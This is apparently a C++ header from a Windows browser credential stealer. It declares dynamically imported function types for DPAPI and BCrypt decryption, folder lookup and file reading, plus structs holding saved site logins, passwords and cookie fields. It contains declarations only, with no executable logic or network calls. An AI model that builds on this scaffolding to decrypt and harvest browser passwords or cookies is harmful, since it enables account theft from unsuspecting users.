﻿#pragma once
#include <string>
#include <vector>
#include <Windows.h>
#include <shlobj_core.h>
#include <bcrypt.h>
#include <shellapi.h>
#include <dpapi.h>
#include "WinApiImport.h"

using String = std::string;
template<class T>
using List = std::vector<T>;


#pragma region WINAPI_FUNCS 
using f_BCryptDecrypt = decltype(BCryptDecrypt);
using f_SHGetFolderPathA = decltype(SHGetFolderPathA);
using f_SHFileOperation = decltype(SHFileOperation);
using f_CreateFileA = decltype(CreateFileA);
using f_GetFileSize = decltype(GetFileSize);
using f_ReadFile = decltype(ReadFile);
using f_CloseHandle = decltype(CloseHandle);


using f_CryptUnprotectData = decltype(CryptUnprotectData);
using f_BCryptOpenAlgorithmProvider = decltype(BCryptOpenAlgorithmProvider);
using f_BCryptSetProperty = decltype(BCryptSetProperty);
using f_BCryptGenerateSymmetricKey = decltype(BCryptGenerateSymmetricKey);

using f_FindFirstFile = decltype(FindFirstFile);
using f_FindClose = decltype(FindClose);



#pragma endregion



struct userData
{
	String url;
	String username;
	String password;
};


struct CookieData
{
	String hostKey;
	String name;
	String value;
	String path;
	String expireUTC;	
};